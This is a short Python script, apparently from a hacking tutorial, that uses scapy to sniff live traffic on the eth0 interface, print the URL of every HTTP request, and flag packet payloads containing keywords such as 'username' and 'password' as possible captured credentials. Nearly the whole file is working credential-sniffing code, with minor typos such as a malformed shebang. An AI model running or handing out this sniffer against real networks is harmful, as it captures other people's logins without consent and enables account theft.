#!usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    #due to prn it performs infinite loop for every packet it triggers the proccess_sniffed_packets function
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)


def get_url(packet):
    # to see the more details of the packet u can print packet.show()
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    # checking whether the packet has raw layer
    # print the packet to see all the layers
    if packet.haslayer(scapy.Raw):
        # in the load label we have the details of username and the password
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        # converting the url into the string
        print("[+] http request >> ", url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+]possible username/password > ", login_info, "\n]n")


sniff("eth0")
